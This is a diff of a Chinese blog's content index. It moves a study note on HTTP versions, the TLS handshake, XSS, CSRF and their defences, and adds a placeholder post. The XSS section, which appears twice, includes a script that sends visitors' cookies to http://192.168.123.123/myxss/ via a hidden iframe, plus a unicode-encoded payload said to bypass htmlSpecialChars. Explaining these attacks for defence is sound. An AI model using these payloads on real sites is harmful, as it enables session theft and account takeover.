-<p>例如，用JavaScript在网站论坛上发布一段恶意的JavaScript代码，这就是脚本注入，而同时如果这个代码内容有请求外部服务器的功能，那么就叫做XSS。</p>
-<p>因此，可以理解为<strong>XSS（跨站脚本）= 脚本注入 + 请求外部服务器的功能</strong>。</p>
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>例如，在某论坛网站中的发帖内容写下如下代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;一直弹窗&#x27;</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>假设该论坛网站没有任何过滤及其它防御机制的情况下，任何访问这个帖子的用户，都会在客户端界面一直弹出这个弹窗。</p>
-<p><strong>这就是最简单的脚本注入。</strong>当然这个脚本并没有什么实质性的危害，那么XSS就是基于脚本注入的方法来完成，但它注入的是含有请求跨站功能的脚本。</p>
-<p>例如，在上面提到的论坛网站中，注入如下代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 构造泄露信息用的 URL</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line"><span class="javascript">    hideFrame.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line"><span class="javascript">    <span class="comment">// 开工</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span></span><br><span class="line"><span class="javascript">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该段代码会将任何访问该帖子的用户的cookie传给一个为<code>http://192.168.123.123/myxss/</code>的服务器，该服务器可以拿着这个cookie访问对应的网站，并登录该用户的账号，继而可以进行其它操作。</p>
-<p>因此，上面这段代码就是XSS。</p>
-<h3 id="CSRF——跨站请求伪造"><a href="#CSRF——跨站请求伪造" class="headerlink" title="CSRF——跨站请求伪造"></a>CSRF——跨站请求伪造</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>CSRF，全称为<strong>Cross-site request forgery</strong>，中文名为跨站请求伪造。是一种让用户在当前已登录的Web应用程序上<strong>执行一些非本意的操作</strong>（如改名，删帖，发邮件等）的攻击方法。</p>
-<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>一般来说，CSRF是由XSS实现的，在跨站脚本的基础上，实现伪造请求，导致受害者会执行一些自己本不愿意执行的操作。</p>
-<p><strong>注：CSRF也可以不通过XSS来实现。</strong></p>
-<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是以上面的对某论坛网站的XSS攻击为例，在外部服务器成功获得用户的cookie后，它可以利用cookie，伪造成用户对论坛网站发起一系列的请求，例如修改用户名称，修改用户密码等。此时，就可以称该攻击为CSRF。</p>
-<h3 id="防范XSS和CSRF⭐️"><a href="#防范XSS和CSRF⭐️" class="headerlink" title="防范XSS和CSRF⭐️"></a>防范XSS和CSRF⭐️</h3><p><em><strong>核心思想：不相信任何外部来源数据！！！</strong></em></p>
-<p>一般来说，大部分的CSRF都是基于XSS的，因此可以说防住了XSS，也就基本防住了CSRF。</p>
-<p>对于防范XSS，主要有以下两个方法：</p>
-<ol>
-<li><strong>输入过滤：对外部输入进行彻底的敏感字符过滤</strong>——前端+后端</li>
-<li><strong>输出过滤：在显示在页面上时，做一些处理让敏感的代码脚本无法顺利执行</strong>——前端</li>
-</ol>
-<p>理论上，只要有输入数据的的地方，就存在XSS的漏洞，JavaScript的脚本可以以各种形式（如明文、编码等）注入到数据库中。</p>
-<p>就像上面提到的 JS 会以各种非法形式注入，其主要非法形式有两类：</p>
-<ol>
-<li><p><strong>明文：</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js 恶意代码</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>​        要处理好明文注入的过滤。</p>
-</li>
-<li><p><strong>编码：</strong></p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
-<p>上面这个编码为unicode编码，它可以绕过<code>htmlSpecialChars</code>的过滤并入库，然后在展示该信息的时候，html 会自动将unicode编码转换成明文即真正的可执行脚本。</p>
-<p>由于不仅unicode编码可以注入，其它类型的编码也可以（道理类似），我们需要尽量将页面的字符编码统一设置为一种（如unicode: utf-8），这样便于我们专注于处理unicode编码的注入。</p>
-</li>
-</ol>
-<h4 id="其它一些通用的防范方法"><a href="#其它一些通用的防范方法" class="headerlink" title="其它一些通用的防范方法"></a>其它一些通用的防范方法</h4><ol>
-<li><p>在输出html时，加上<code>Content Security Policy</code>的<code>Http Header</code></p>
-<p>作用：防止页面被XSS攻击时，嵌入第三方的脚本文件</p>
-</li>
-<li><p>在设置Cookie时，加上<code>HttpOnly</code>参数</p>
-<p>作用：可以防止页面被XSS攻击时，Cookie信息被盗取</p>
-<p>缺点：网站本身的<code>JavaScript</code>代码也无法操作Cookie</p>
-</li>
-<li><p>在开发API时，检验请求的Referer参数</p>
-<p>作用：可以在一定程度上防止CSRF攻击</p>
-</li>
-</ol>
+    <title>My first blog</title>
+    <url>/2021/02/14/My-first-blog/</url>
+    <content><![CDATA[<p>##Fist Charpter</p>
+<p>content</p>
+<hr>
+<p>##Second Charpter</p>
+<p>content</p>
+<hr>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>content</p>
+<p>:wq</p>
 ]]></content>
-      <categories>
-        <category>Network</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-      </tags>
   </entry>
   <entry>
     <title>JavaScript琐碎基础---学习手记</title>
@@ -1695,6 +1511,190 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP&amp;网络安全篇</title>
+    <url>/2021/12/06/HTTP&amp;Network/</url>
+    <content><![CDATA[<p><strong>本篇文章主要针对常见的一些计算机网络概念进行梳理和总结，便于今后对于web开发的深入理解。</strong></p>
+<a id="more"></a>
+
+<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="HTTP协议篇"><a href="#HTTP协议篇" class="headerlink" title="HTTP协议篇"></a>HTTP协议篇</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP是基于TCP/IP协议的<strong>应用层协议</strong>。它不涉及数据报传输，主要规定了客服端与服务器的通信格式，默认使用80端口。</p>
+<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
+<li><p>1996年——发布</p>
+</li>
+<li><p>1.0版本较0.9版本中只有GET命令的情况，还引入了POST和HEAD命令。</p>
+</li>
+<li><p>HTTP请求和回应格式，除了包括<strong>数据部分</strong>还必须包括<strong>头信息即HTTP HEADER</strong>（用来描述元数据）</p>
+</li>
+</ul>
+<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>请求命令+多行头信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 请求命令</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) 多行头信息</span><br><span class="line">Accept: *&#x2F;* 多行头信息</span><br></pre></td></tr></table></figure>
+<h4 id="回应格式"><a href="#回应格式" class="headerlink" title="回应格式"></a>回应格式</h4><p>头信息+空行+数据。第一行为协议版本+状态码+状态描述</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK 第一行</span><br><span class="line">Content-Type: text&#x2F;plain  从这儿开始是头信息</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											这个是空行</span><br><span class="line">&lt;html&gt;												从这儿开始是数据</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a>Content-Type 字段</h4><p>头信息为ASCII码，但数据可以为任意格式。因此需要用**<code>Content-Type</code>告诉客户端该数据的格式**。</p>
+<p>常见的<code>Content-Type</code>字段值如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
+<p>这些数据类型统称为 <strong>MIME type</strong>，格式为：一级类型/二级类型。</p>
+<h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a>Content-Encoding 字段</h4><p>由于<strong>发送的数据可以为任意格式</strong>，因此可以把数据压缩后再发送。**<code>Content-Encoding</code>字段说明数据的压缩方式**。常见压缩方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
+<p>同时<strong>客户端在请求时</strong>，可以说明自己所<strong>接受的压缩方式</strong>，使用**字段<code>Accept-Encoding</code>**。如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>HTTP/1.0 主要问题是：<strong>每个TCP连接只能发送一个请求</strong>。数据发送完毕，链接就关闭了。再请求其它资源，就必须再新建一个TCP连接。而TCP连接需要客户端与服务器三次握手，并且开始时由于slow start，速度很慢，因此新建TCP连接成本很高。</p>
+<p><strong>为了解决这个问题，部分浏览器使用了非标准字段<code>Connection</code>。</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<p>上面这个字段要求服务器不要关闭TCP连接，以便其它请求复用，该可复用的TCP连接直到客户端或服务器主动关闭，才会断开。但这种方法并不标准。</p>
+<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>从1997沿用至201几，直到HTTPS。</p>
+<h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul>
+<li>1.1版本<strong>最大的变化</strong>就是引入了<strong>持久连接（persistent connection）</strong>，即TCP连接默认不关闭，可以被多个请求复用，并且不用声明<code>Connection:keep-alive</code>。</li>
+<li>客户端与服务器之间一段时间没有通信，就会主动关闭连接。但规范做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li>
+</ul>
+<p><strong>注：</strong>对于同一个域名，大多数浏览器允许同时建立<strong>6个持久连接</strong>。</p>
+<h4 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h4><p>在1.0版本中，在同一个TCP连接里，如果客户端要<strong>请求两个资源</strong>，会<strong>先发送A请求</strong>，然后等待服务器回应，<strong>收到响应</strong>之后<strong>再发送B请求</strong>。</p>
+<p>在1.1版本中引入了<strong>管道机制（pipelining）</strong>，其允许浏览器<strong>同时发送A请求和B请求</strong>，但服务器还是按照顺序，先回应A请求，完成之后再回应B请求。</p>
+<p>因此，管道机制使<strong>客户端可以在同一个TCP连接中同时发送多个请求</strong>。</p>
+<h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p><strong>用于声明本次回应的数据长度。</strong></p>
+<h4 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h4><p>简言之，就是服务器<strong>产生一块数据就发送一块</strong>，即采用流模式（stream）取代缓存模式（buffer）。</p>
+<p>因此，1.1版本可以不使用<code>Content-Length</code>字段，而使用分块传输编码（chunked transfer encoding）。只要<strong>请求或回应的头信息中有<code>Transfer-Encoding</code>字段</strong>，就表明回应将由数量未定的数据块组成。</p>
+<p><strong>注：</strong>每个非空的数据块之前，会有一个16进制的数值来表示这个块的长度。最后是一个大小为0的块，表示本次回应的数据发送完毕。示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h4 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h4><ul>
+<li>1.1版本还新增了许多动词方法，如：<code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
+<li>客户端请求头信息<strong>新增了<code>HOST</code>字段</strong>，用来指定服务器的域名。有了<code>HOST</code>字段就可以将请求发往同一服务器上的不同网站。（为虚拟机兴起打下基础）</li>
+</ul>
+<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>存在<strong>队头堵塞（Head-of-line blocking）</strong>。尽管允许复用TCP连接，但在<strong>同一个TCP连接里，数据通信依然是按次序进行</strong>，服务器只有处理完第一个请求的回应，才能进行下一个请求的回应。如果前一个请求的回应很慢，那么后面就会有许多请求排队。</p>
+<p>避免队头堵塞的方法有：</p>
+<pre><code>1. **减少请求次数**。例如：合并脚本和样式表、将图片嵌入CSS代码
+1. **同时多开持久连接**。例如：域名分片（domain sharding）即所需下载可以来自多个域，可以解决并发限制。
+</code></pre>
+<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="二进制协议"><a href="#二进制协议" class="headerlink" title="二进制协议"></a>二进制协议</h4><p>HTTP/1.1版本的头信息是文本（ASCII码），数据体是文本或二进制。但HTTP/2则是一个<strong>彻底的二进制协议</strong>，头信息和数据体都是二进制，并且统称为“帧”（frame）：头信息帧和数据帧。</p>
+<p>二进制协议的好处是：可以定义额外的帧。</p>
+<h4 id="多工-Multiplexing"><a href="#多工-Multiplexing" class="headerlink" title="多工 Multiplexing"></a>多工 Multiplexing</h4><p>在HTTP/2中，在同一个TCP连接中，客户端和浏览器都可以同时发送多个请求和响应，并且不用按照顺序一一对应，这就避免了队头堵塞的问题。</p>
+<p>例如：在一个TCP连接中，服务器同时收到A请求和B请求，于是先回应A请求，结果发现处理十分耗时，于是就发送A请求已处理好的部分，接着处理回应B请求，完成之后，再处理发送A请求的剩下的部分。我们称这种<strong>双工的、实时的通信</strong>为<strong>多工</strong>。</p>
+<h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>HTTP/2的<strong>数据包是不按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应，因此需要<strong>对数据包进行标记</strong>，指出它属于哪个回应。</p>
+<p>HTTP/2将<strong>每个请求或者回应的所有数据包</strong>都称为一个<strong>数据流（stream）</strong>。每个数据流都有一个唯一的编号。数据包发送的时候，必须标记数据流ID，一标识它属于哪个数据流。此外客户端发出的数据流ID一律为奇数，服务端发出的数据流ID一律为偶数。</p>
+<p>数据流发送到一半时，客户端和服务器都可以发出信号来取消这个数据流。在HTTP/1.1版本中，取消数据流发送的唯一方法是关闭TCP连接。HTTP/2可以取消某一次请求同时保证TCP连接还是开启的状态，可以被其它请求复用。</p>
+<p>客户端还可以指定数据流的优先级，优先级越高，服务器会越早对其回应。</p>
+<h4 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a>头信息压缩</h4><p>由于每次请求，很多<strong>请求头信息中的字段都是重复的</strong>（如Cookie、User Agent等），这会造成很多带宽的浪费。HTTP/2优化了这一点，引入<strong>头信息压缩机制</strong>。一方面，头信息<strong>使用<code>gzip</code><strong>等方法压缩后再发送；另一方面，客户端和服务端维护一张</strong>头信息表</strong>，该表为<strong>字段和索引号的映射</strong>，之后就只发送索引号，以提高速度。</p>
+<h4 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h4><p>HTTP/2允许服务器未收到请求，主动向客户端发送资源。</p>
+<p>例如：客户端请求一个包含很多静态资源的网页，服务器会主动把这些静态资源随网页一起发送给客户端，这样就不需要等客户端收到网页后解析HTML发现有静态资源再请求静态资源了。</p>
+<h2 id="HTTPS——番外篇"><a href="#HTTPS——番外篇" class="headerlink" title="HTTPS——番外篇"></a>HTTPS——番外篇</h2><p>互联网的通信安全是建立在<strong>SSL/TLS</strong>协议之上的。</p>
+<p><strong>注</strong>：SSL——<strong>Secure Sockets Layer</strong>, TLS——SSL的升级</p>
+<h3 id="使用HTTPS的原因-amp-作用"><a href="#使用HTTPS的原因-amp-作用" class="headerlink" title="使用HTTPS的原因&amp;作用"></a>使用HTTPS的原因&amp;作用</h3><p><strong>对比：</strong></p>
+<ul>
+<li><p>HTTP不使用SSL/TLS，因此是不加密的通信，所有信息都是明文传播</p>
+<ol>
+<li><strong>窃听风险（eavesdropping）：</strong>第三方可以截获并获知通信内容</li>
+<li><strong>篡改风险（tampering）：</strong>第三方可以截获并修改通信内容</li>
+<li><strong>冒充风险（pretending）：</strong>第三方可以冒充他人身份参与通信</li>
+</ol>
+</li>
+<li><p>基于SSL/TLS协议的HTTPS的好处</p>
+<ol>
+<li><strong>所有信息都是加密传输</strong>——无法被窃听</li>
+<li><strong>具有校验机制</strong>——通信内容一旦被篡改，通信双方都能发现</li>
+<li><strong>配备身份证书</strong>——防止身份冒充</li>
+</ol>
+</li>
+</ul>
+<h3 id="SSL-TLS协议的基本运行过程"><a href="#SSL-TLS协议的基本运行过程" class="headerlink" title="SSL/TLS协议的基本运行过程"></a>SSL/TLS协议的基本运行过程</h3><p>该协议的基本思路为：<strong>非对称加密：公钥加密，私钥解密</strong>。即客户端先向服务端索要公钥，然后再用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
+<ol>
+<li><p><strong>保证公钥不被篡改的方法</strong></p>
+<p>答：将<strong>公钥放入数字证书</strong>中，只要证书是可信的，那么公钥就是可信的。</p>
+</li>
+<li><p><strong>用公钥加密计算量太大，需要减少耗用时间的方法</strong></p>
+<p>答：每一次对话（session），客户端和服务端会生成一个“对话密钥”（session key），用它来加密信息。由于“对话密钥”是对称加密，因此运算速度非常快，因此如果服务器公钥只用于加密“对话密钥”本身的话，就会大大减少加密运算的消耗时间。</p>
+</li>
+</ol>
+<p>所以，SSL/TLS协议的基本过程是：</p>
+<ol>
+<li>客户端向服务端<strong>索要并验证公钥</strong> —— 握手阶段</li>
+<li>双方协商<strong>生成“对话密钥”</strong>              —— 握手阶段</li>
+<li>双方采用“对话密钥”<strong>进行加密通信</strong></li>
+</ol>
+<h3 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h3><p>握手阶段涉及四次通信，该阶段的所有通信都是明文的。</p>
+<h4 id="阶段一：客户端发出请求"><a href="#阶段一：客户端发出请求" class="headerlink" title="阶段一：客户端发出请求"></a>阶段一：客户端发出请求</h4><p>首先，客户端向服务器发送加密通信请求。其发送的请求内容主要有以下：</p>
+<ol>
+<li>支持的协议版本，例如：TLS 1.0</li>
+<li>客户端生成的随机数，用于稍后生成“对话密钥”</li>
+<li>支持的加密方法，例如：RSA公钥加密</li>
+<li>支持的压缩方法</li>
+</ol>
+<h4 id="阶段二：服务器回应"><a href="#阶段二：服务器回应" class="headerlink" title="阶段二：服务器回应"></a>阶段二：服务器回应</h4><p>服务器收到客户端请求后，向客户端发出响应。响应内容主要包括以下：</p>
+<ol>
+<li>确认使用的加密通信协议版本。如果双方支持的版本不一致，则服务器会关闭本次加密通信</li>
+<li>服务器生成的随机数，用于稍后生成“对话密钥”</li>
+<li>确认使用的加密方法</li>
+<li>服务器证书</li>
+</ol>
+<h4 id="阶段三：客户端回应"><a href="#阶段三：客户端回应" class="headerlink" title="阶段三：客户端回应"></a>阶段三：客户端回应</h4><p>客户端收到服务器的响应后，首先要验证服务器的数字证书。</p>
+<p>如果<strong>1. 证书不可信。2. 证书中的域名与实际域名不一致。3. 证书已经过期</strong>，就会向访问者显示一个警告，让其选择是否继续通信。</p>
+<p>如果证书没有问题，客户端会<strong>从证书中取出服务器的公钥</strong>，然后向服务器发送响应，其内容主要如下：</p>
+<ol>
+<li>客户端生成的随机数。该随机数用公钥加密，防止被窃听。</li>
+<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
+<li>客户端握手结束通知。表示客户端的握手阶段结束，这一项也是前面发送的所有内容的hash值，用来供服务器校验。</li>
+</ol>
+<p><strong>注：</strong>这个阶段生成的随机数是整个握手阶段出现的第三个随机数（”pre-master key”）。有了它之后，客户端和服务器就都同时有了三个随机数，然后双方用事先商定的加密方法，各自生成本次会话所用的同一把“会话密钥”。</p>
+<h4 id="阶段四：服务器最后回应"><a href="#阶段四：服务器最后回应" class="headerlink" title="阶段四：服务器最后回应"></a>阶段四：服务器最后回应</h4><p>服务器收到第三个随机数之后，会计算生成本次会话所用的“会话密钥”。然后向客户端发送最后响应。其内容主要如下：</p>
+<ol>
+<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
+<li>服务器握手结束通知。表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</li>
+</ol>
+<p>至此，整个握手阶段全部结束。接下来就是，客户端与服务器进行加密通信，这就完全是<strong>使用普通的HTTP协议</strong>了，只不过所<strong>发送的内容都使用“会话密钥”进行了加密</strong>。</p>
+<h2 id="网络安全篇"><a href="#网络安全篇" class="headerlink" title="网络安全篇"></a>网络安全篇</h2><h3 id="XSS——跨站脚本"><a href="#XSS——跨站脚本" class="headerlink" title="XSS——跨站脚本"></a>XSS——跨站脚本</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>XSS，全称为<strong>Cross-site scripting</strong>，中文名称为跨站脚本，是一种<strong>对网络应用程序的安全漏洞的攻击</strong>，即是一种<strong>代码注入</strong>。这类攻击通常包含了HTML和用户脚本语言（主要为JavaScript）。</p>
+<p>例如，用JavaScript在网站论坛上发布一段恶意的JavaScript代码，这就是脚本注入，而同时如果这个代码内容有请求外部服务器的功能，那么就叫做XSS。</p>
+<p>因此，可以理解为<strong>XSS（跨站脚本）= 脚本注入 + 请求外部服务器的功能</strong>。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>例如，在某论坛网站中的发帖内容写下如下代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;一直弹窗&#x27;</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>假设该论坛网站没有任何过滤及其它防御机制的情况下，任何访问这个帖子的用户，都会在客户端界面一直弹出这个弹窗。</p>
+<p><strong>这就是最简单的脚本注入。</strong>当然这个脚本并没有什么实质性的危害，那么XSS就是基于脚本注入的方法来完成，但它注入的是含有请求跨站功能的脚本。</p>
+<p>例如，在上面提到的论坛网站中，注入如下代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 构造泄露信息用的 URL</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line"><span class="javascript">    hideFrame.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line"><span class="javascript">    <span class="comment">// 开工</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span></span><br><span class="line"><span class="javascript">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该段代码会将任何访问该帖子的用户的cookie传给一个为<code>http://192.168.123.123/myxss/</code>的服务器，该服务器可以拿着这个cookie访问对应的网站，并登录该用户的账号，继而可以进行其它操作。</p>
+<p>因此，上面这段代码就是XSS。</p>
+<h3 id="CSRF——跨站请求伪造"><a href="#CSRF——跨站请求伪造" class="headerlink" title="CSRF——跨站请求伪造"></a>CSRF——跨站请求伪造</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>CSRF，全称为<strong>Cross-site request forgery</strong>，中文名为跨站请求伪造。是一种让用户在当前已登录的Web应用程序上<strong>执行一些非本意的操作</strong>（如改名，删帖，发邮件等）的攻击方法。</p>
+<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>一般来说，CSRF是由XSS实现的，在跨站脚本的基础上，实现伪造请求，导致受害者会执行一些自己本不愿意执行的操作。</p>
+<p><strong>注：CSRF也可以不通过XSS来实现。</strong></p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是以上面的对某论坛网站的XSS攻击为例，在外部服务器成功获得用户的cookie后，它可以利用cookie，伪造成用户对论坛网站发起一系列的请求，例如修改用户名称，修改用户密码等。此时，就可以称该攻击为CSRF。</p>
+<h3 id="防范XSS和CSRF⭐️"><a href="#防范XSS和CSRF⭐️" class="headerlink" title="防范XSS和CSRF⭐️"></a>防范XSS和CSRF⭐️</h3><p><em><strong>核心思想：不相信任何外部来源数据！！！</strong></em></p>
+<p>一般来说，大部分的CSRF都是基于XSS的，因此可以说防住了XSS，也就基本防住了CSRF。</p>
+<p>对于防范XSS，主要有以下两个方法：</p>
+<ol>
+<li><strong>输入过滤：对外部输入进行彻底的敏感字符过滤</strong>——前端+后端</li>
+<li><strong>输出过滤：在显示在页面上时，做一些处理让敏感的代码脚本无法顺利执行</strong>——前端</li>
+</ol>
+<p>理论上，只要有输入数据的的地方，就存在XSS的漏洞，JavaScript的脚本可以以各种形式（如明文、编码等）注入到数据库中。</p>
